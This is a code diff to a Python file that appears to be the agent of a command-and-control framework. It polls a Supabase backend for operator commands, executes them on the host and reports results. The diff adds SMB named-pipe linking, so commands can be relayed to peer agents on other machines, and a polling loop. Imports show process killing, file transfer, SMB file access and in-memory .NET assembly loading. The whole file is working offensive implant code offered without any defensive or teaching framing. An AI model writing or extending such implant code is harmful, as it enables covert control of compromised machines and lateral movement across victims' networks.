@@ -1,13 +1,20 @@
+# command_execution.py
+
 import os
 import logging
+import time
 from supabase import create_client
 from .commands import update_command_status, fetch_pending_commands_for_hostname
 from .file_operations import handle_download_command, handle_upload_command, fetch_pending_uploads, download_from_supabase
 from .system_info import get_system_info
-from .config import supabase, SUPABASE_KEY
+from .config import supabase, PIPE_NAME_TEMPLATE
 
 # Conditional import based on the operating system
 if os.name == 'nt':  # 'nt' indicates Windows
+    from multiprocessing import Pipe
+    import pywintypes
+    import win32pipe
+    import win32file
     from utils.winapi import ls, list_users_in_group
     from utils.winapi.smb_get import smb_get  # Ensure correct import
     from utils.winapi.smb_write import smb_write  # Ensure correct import
@@ -17,6 +24,50 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.ps import list_processes, grep_processes, terminate_process  # Import ps functions
     from utils.winapi.run import run_process  # Import the run function
     from utils.winapi.netexec import load_dotnet_assembly  # Import the netexec function
+
+smb_pipe_conn = None
+#PIPE_NAME_TEMPLATE = r'\\{ip_address}\pipe\smb_pipe'
+
+def link_smb_agent(ip_address):
+    global smb_pipe_conn
+    pipe_name = PIPE_NAME_TEMPLATE.format(ip_address=ip_address)
+    try:
+        smb_pipe_conn = win32file.CreateFile(
+            pipe_name,
+            win32file.GENERIC_READ | win32file.GENERIC_WRITE,
+            0, None,
+            win32file.OPEN_EXISTING,
+            0, None
+        )
+        win32pipe.SetNamedPipeHandleState(smb_pipe_conn, win32pipe.PIPE_READMODE_MESSAGE, None, None)
+        return f"SMB agent linked successfully to {ip_address}."
+    except pywintypes.error as e:
+        smb_pipe_conn = None
+        return f"Failed to link SMB agent: {e}"
+
+def unlink_smb_agent(ip_address):
+    global smb_pipe_conn
+    try:
+        if smb_pipe_conn:
+            # Send a special disconnect message
+            win32file.WriteFile(smb_pipe_conn, b'disconnect')
+            win32file.CloseHandle(smb_pipe_conn)
+            smb_pipe_conn = None
+            return f"SMB agent unlinked successfully from {ip_address}."
+        return f"SMB agent is not linked to {ip_address}."
+    except pywintypes.error as e:
+        return f"Failed to unlink SMB agent: {e}"
+
+def send_command_to_smb_agent(command):
+    global smb_pipe_conn
+    if smb_pipe_conn:
+        try:
+            win32file.WriteFile(smb_pipe_conn, command.encode('utf-8'))
+            result = win32file.ReadFile(smb_pipe_conn, 64 * 1024)
+            return result[1].decode('utf-8')
+        except pywintypes.error as e:
+            return f"Failed to communicate with SMB agent: {e}"
+    return "SMB agent is not linked."
 
 def handle_kill_command(command_id, command_text, hostname):
     """Handles the kill command, updates the command status to 'Completed', marks the agent as 'Dead', and exits."""
@@ -84,6 +135,31 @@ def execute_commands():
             # Handle kill command (this will exit the script if applicable)
             if command_text.lower().startswith('kill'):
                 handle_kill_command(command_id, command_text, hostname)
+
+            # Handle 'link smb agent <ip>' command
+            elif command_text.lower().startswith('link smb agent'):
+                parts = command_text.split()
+                if len(parts) == 4:
+                    ip_address = parts[3]
+                    result = link_smb_agent(ip_address)
+                    update_command_status(command_id, 'Completed', result, hostname, ip, os_info, username)
+                else:
+                    update_command_status(command_id, 'Failed', 'Invalid link smb agent command format. Use "link smb agent <ip>".', hostname, ip, os_info, username)
+
+            # Handle 'unlink smb agent <ip>' command
+            elif command_text.lower().startswith('unlink smb agent'):
+                parts = command_text.split()
+                if len(parts) == 4:
+                    ip_address = parts[3]
+                    result = unlink_smb_agent(ip_address)
+                    update_command_status(command_id, 'Completed', result, hostname, ip, os_info, username)
+                else:
+                    update_command_status(command_id, 'Failed', 'Invalid unlink smb agent command format. Use "unlink smb agent <ip>".', hostname, ip, os_info, username)
+
+            # Handle 'smb' commands to send to SMB agent
+            elif command_text.lower().startswith('smb '):
+                result = send_command_to_smb_agent(command_text[4:])  # Remove 'smb ' prefix
+                update_command_status(command_id, 'Completed', result, hostname, ip, os_info, username)
 
             # Handle 'ls' command only if on Windows
             elif os.name == 'nt' and command_text.lower().startswith('ls'):
@@ -293,3 +369,9 @@ def execute_commands():
                     status = 'Failed'
                     output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+if __name__ == "__main__":
+    logging.basicConfig(level=logging.INFO)
+    while True:
+        execute_commands()
+        time.sleep(5)
